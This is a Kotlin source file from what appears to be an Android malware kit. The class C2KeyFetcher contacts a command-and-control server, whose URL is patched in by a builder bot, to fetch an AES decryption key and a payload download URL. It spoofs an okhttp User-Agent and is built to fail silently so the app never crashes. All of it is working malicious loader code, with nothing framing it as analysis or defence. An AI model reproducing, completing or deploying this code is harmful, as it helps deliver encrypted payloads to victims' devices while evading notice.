package com.cristal.bristral.tristal.mistral.network

import android.util.Base64
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import javax.net.ssl.HttpsURLConnection

/**
 * C2KeyFetcher — fetches AES key and optional payload URL from C2.
 *
 * C2_KEY_URL is patched by bot into dex — points to a JSON file
 * on GitHub raw content (already have this infrastructure).
 *
 * JSON format on server:
 * {
 *   "k": "base64_aes_key",
 *   "u": "https://payload_download_url_or_empty"
 * }
 *
 * If fetch fails → falls back to embedded key in dex.
 * Silent — never crashes, always returns something.
 */
object C2KeyFetcher {

    // ── Patched by bot ─────────────────────────────────────────
    private const val C2_KEY_URL = "C2_KEY_URL_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
    // ───────────────────────────────────────────────────────────

    private const val CONNECT_TIMEOUT = 8000  // ms
    private const val READ_TIMEOUT    = 10000 // ms

    data class C2Response(
        val aesKeyB64: String?,      // fetched AES key (null = use embedded)
        val payloadUrl: String?      // fetched payload URL (null = use assets)
    )

    /**
     * Fetch key and URL from C2.
     * Returns C2Response with nulls if fetch fails.
     * Never throws.
     */
    fun fetch(): C2Response {
        // If placeholder not patched → skip fetch
        if (C2_KEY_URL == "C2_KEY_URL_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE" || C2_KEY_URL.isBlank()) {
            return C2Response(null, null)
        }

        return try {
            val url  = URL(C2_KEY_URL)
            val conn = url.openConnection() as HttpsURLConnection
            conn.connectTimeout = CONNECT_TIMEOUT
            conn.readTimeout    = READ_TIMEOUT
            conn.requestMethod  = "GET"
            conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
            conn.setRequestProperty("Accept", "application/json")

            val code = conn.responseCode
            if (code != HttpURLConnection.HTTP_OK) {
                conn.disconnect()
                return C2Response(null, null)
            }

            val response = conn.inputStream.bufferedReader().readText()
            conn.disconnect()

            val json       = JSONObject(response)
            val keyB64     = json.optString("k", "").ifBlank { null }
            val payloadUrl = json.optString("u", "").ifBlank { null }

            C2Response(keyB64, payloadUrl)

        } catch (e: Exception) {
            C2Response(null, null)
        }
    }
}
